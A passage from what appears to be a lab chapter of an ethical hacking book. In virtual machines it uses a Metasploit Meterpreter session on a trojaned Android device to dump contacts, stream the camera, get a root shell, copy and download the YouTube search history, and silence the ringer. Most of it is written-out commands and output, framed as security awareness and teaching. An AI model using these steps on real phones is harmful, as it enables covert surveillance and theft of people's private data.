- raw: "    ```\n    meterpreter > dump_contacts [*] Fetching 1 contact into list\n\
    \    [*] Contacts list saved to: contacts_dump_20210927103858.txt\n    ```\n\n\
    \    Meterpreter will respond with the number of contacts it found, along with\
    \ the filename where it saved those contacts on your Kali machine.\n\n2.  Open\
    \ a second terminal window in your Kali VM and enter `cd` to change into your\
    \ home directory. Then enter the command `ls con*` to list any contact files Meterpreter\
    \ dumped there:\n\n    ```\n    kali@kali:~# ls con*\n    contacts_dump_20210927103858.txt\
    \ \n    ```\n\n    You’ll see a *.txt* file named *contacts\\_dump\\_* followed\
    \ by a timestamp (year, month, day, and time in numeric format).\n\n3.  Enter\
    \ `cat con` and press **TAB** to autocomplete the contacts filename, and then\
    \ press **ENTER** to display the contents of the file:\n\n    ```\n    kali@kali:~#\
    \ cat contacts_dump_20210927103858.txt --snip--\n    #1\n    Name: Bryson Payne\n\
    \    Number: 404-555-1212\n    Email: brysonpayne@myuniversity.edu\n    ```\n\n\
    An attacker can see the full contact information of every person listed in your\
    \ smartphone’s Contacts app, in addition to reading your text messages and seeing\
    \ every phone call you’ve made recently!\n\n### Spying Through the Camera\n\n\
    If an attacker gains remote control of your smartphone, they can hijack the device’s\
    \ camera and/or microphone. As we’ll see, this kind of spying is disturbingly\
    \ easy.\n\n1.  If you’ve got a webcam, connect it to the Android VM by going to\
    \ the menu bar of your VM under **Devices**▶**Webcams** and selecting its name.\n\
    \n2.  After attaching the webcam, reboot your Android VM (select **Machine**▶**Reset**\
    \ and click the **reset** button). Then rerun the trojan by clicking the MainActivity\
    \ app.\n\n3.  In Metasploit, press **ENTER** after the error `Meterpreter session\
    \ closed` and then enter the command `exploit`.\n\n4.  When the new Meterpreter\
    \ session starts, enter the command `webcam_list` to see your camera listed:\n\
    \n    ```\n    meterpreter > webcam_list\n    1: Back Camera\n    ```\n\n5.  Use\
    \ the command `webcam_stream` to view a live feed from the camera:\n\n    ```\n\
    \    meterpreter > webcam_stream\n    ```\n\nThe webcam will begin streaming video\
    \ (slowly) to your Kali VM through the Firefox browser, until you close the web\
    \ browser video stream and press CTRL\\-C (on Windows) or CONTROL\\-C (on macOS)\
    \ in the Meterpreter terminal to stop the stream.\n\nAs you can see, an attacker\
    \ can stream video from your smartphone’s webcam if your device is ever compromised\
    \ through an exploit like the one we built, just like they can access your laptop\
    \ or desktop webcam. But unlike with your computer’s webcam, you probably take\
    \ your smartphone with you *everywhere*, as do your friends and family. Most of\
    \ us don’t want to cover the camera on our smartphone like we do with our laptop,\
    \ so it’s even more important to be careful which apps we install on our smartphones\
    \ and what permissions we give them.\n\n### Stealing Files and Snooping Around\
    \ in Logs\n\nJust as we did in our Windows 10 hack, we can upload and download\
    \ files from the Android device’s storage using the upload and download commands.\
    \ We can even access protected, sensitive files using the device’s shell terminal\
    \ if the user gives us superuser access.\n\n1.  Enter `shell` in Meterpreter to\
    \ enter the Android terminal shell:\n\n    ```\n    meterpreter > shell\n    Process\
    \ 1 created.\n    Channel 1 created.\n    ```\n\n2.  The Android shell doesn’t\
    \ show a prompt at the beginning of the line, so your cursor will be on a blank\
    \ line. Enter the commands `cd /` and `ls` to change directories to the root */*\
    \ directory and list all folders on the device:\n\n    ```\n    cd /ls\n    acct\n\
    \    bugreports\n    cache\n    charger\n    config\n    d\n    data--snip--\n\
    \    ```\n\n    The *data* folder contains a treasure trove of user data, including\
    \ the user’s YouTube, browser, and other app history files. Remember when we ran\
    \ the YouTube app and searched for “Bryson Payne TED Talk”? If an app stores a\
    \ log or history file with recent search results, we can access those files as\
    \ long as the user grants administrator or superuser privileges to the app.\n\n\
    3.  Enter `su` into the Meterpeter Android shell to request superuser access.\n\
    \n    ```\n    su\n    ```\n\n4.  Immediately in the Android VM, you’ll see the\
    \ permissions window pop up, as shown in [Figure 9-8](#c09.xhtml#figure9-8). Click\
    \ **Allow** to give Meterpreter superuser access.\n\n    ![Figure 9-8: Giving\
    \ Meterpreter superuser access](image_fi/502000c09/f09008.png)\n\n    Figure 9-8:\
    \ Giving Meterpreter superuser access\n\n5.  Change directories into */data/data/com.google.android.youtube*\
    \ and list the directory contents with `ls`:\n\n    ```\n    cd /data/data/com.google.android.youtubels\n\
    \    cache\n    code_cache\n    databases\n    files\n    no_backup\n    shared_prefs\n\
    \    ```\n\n6.  The *databases* folder contains various files used by the app,\
    \ including one that stores the YouTube search history. To find that file, enter\
    \ the commands `cd databases` and `ls`.\n\n    ```\n    cd databasels\n    ```\n\
    \n7.  In the short list of files that appears, you’ll find the *history.db* file.\
    \ Run the command `cat history.db` to view the device’s YouTube Search history.\n\
    \n    ```\n    cat history.db\n    ����h�!##�mat 3@tablesuggestionssuggestionsCREATE\
    \ TABLE suggestions (_id INTEGER PRIMARY KEY,display1 TEXT UNIQUE ON CONFLICT\
    \ REPLACE,display2 TEXT,query TEXT,date LONG)5I#indexsqlite_autoindex_suggestions_1suggestionW--ctableandroid_metada��677bryson\
    \ payne ted talkbryson payne ted talkl0�/cale TEXT)\n    ��7\tbryson payne ted\
    \ talk\n    ```\n\n    Because this is a special database-formatted file, not\
    \ all of the characters are printable, but look at the last line or two—our search\
    \ for “Bryson Payne TED Talk” is viewable in plaintext! If you search for other\
    \ videos on YouTube and then rerun that last command (`cat history.db`), you’ll\
    \ see new results added to the file.\n\n8.  Now we’ll download the YouTube search\
    \ history file to the Kali VM. First, we need to copy it to the Metasploit trojan\
    \ app’s *files* folder:\n\n    ```\n    cp /data/data/com.google.android.youtube/databases/history.db\
    \ /data/data/com.metasploit.stage/files\n    ```\n\n9.  Next, we need to grant\
    \ access to the copied file:\n\n    ```\n    chmod 666 /data/data/com.metasploit.stage/files/history.db\n\
    \    ```\n\n10.  Exit the Android shell by pressing CTRL\\-C (CONTROL\\-C on a\
    \ Mac). Meterpreter will respond with a prompt asking if you want to terminate\
    \ the *channel*, or shell connection. Enter `y`.\n\n     ```\n     ^C\n     Terminate\
    \ channel 1? [y/N] y\n     ```\n\n11.  You’ll now drop back into a regular Meterpreter\
    \ prompt, where you can download the YouTube history file to your Kali VM’s home\
    \ (*/home/kali/*) folder:\n\n     ```\n     meterpreter > download history.db\n\
    \     ```\n\n12.  In a separate terminal window, type `ls` to confirm that the\
    \ *history.db* file downloaded successfully. Then enter `cat history.db` and you’ll\
    \ see the same file contents you saw in the Android shell, with the user’s YouTube\
    \ search history in plaintext.\n\nMalicious hackers can use this technique to\
    \ save a record of your YouTube search history. If you were a forensic data analyst\
    \ working for the FBI or on a company’s security team, however, you could use\
    \ the same technique to discover whether a criminal had watched YouTube videos\
    \ to learn how to make a bomb or commit another crime.\n\n### Turning Off the\
    \ Ringer and More\n\nYou can change settings with Meterpreter and prevent the\
    \ user from being able to change them back. For example, you can turn off the\
    \ ringer on the Android VM by entering the following command in Meterpreter:\n\
    \n```\nmeterpreter > set_audio_mode -m 0\n[*] Ringer mode was changed to 0!\n\
    ```\n\nIn your Android VM, swipe up on your home screen and select **Settings**.\
    \ Search for “ring” and click **Ring volume** to open the Sound settings. The\
    \ Ring volume has been turned off, as shown in [Figure 9-9](#c09.xhtml#figure9-9)."
